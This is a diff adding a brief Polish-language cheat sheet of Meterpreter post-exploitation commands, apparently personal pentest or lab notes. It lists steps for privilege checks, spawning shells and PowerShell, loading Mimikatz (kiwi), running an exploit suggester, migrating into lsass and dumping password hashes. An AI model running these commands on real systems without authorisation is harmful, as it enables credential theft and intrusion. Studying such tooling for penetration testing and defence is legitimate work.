@@ -1,0 +1,33 @@
+1) Command
+      • Sprawdzanie uprawnien
+            ▪ getuid
+      • Ladownaie comand line
+            ▪ shell
+      • Ladowanie Power Shella
+            ▪ load powershell
+            ▪ powershell_shell    
+      • Chowanie sesji do tla
+            ▪ background
+      • Ladowanie Mimikatza
+            ▪ load kiwi
+
+2) Exploit
+      • Poszukiwanie
+            ▪ run post/multi/recon/local_exploit_suggester
+            ▪ hashdump
+ 
+3) Important commands
+      • Wyswietlenie procesow
+            ▪ ps
+      • Migrowanie procesu  ZRZUCENIE HASHY (migrate <pid lsass>) dla windowsa 
+            ▪ migrate <pid>
+            ▪ hashdump   
+      • Wyszukiwanie plikow
+            ▪ search -f <name>
+                
+                
+                
+                
+                
+                
+                
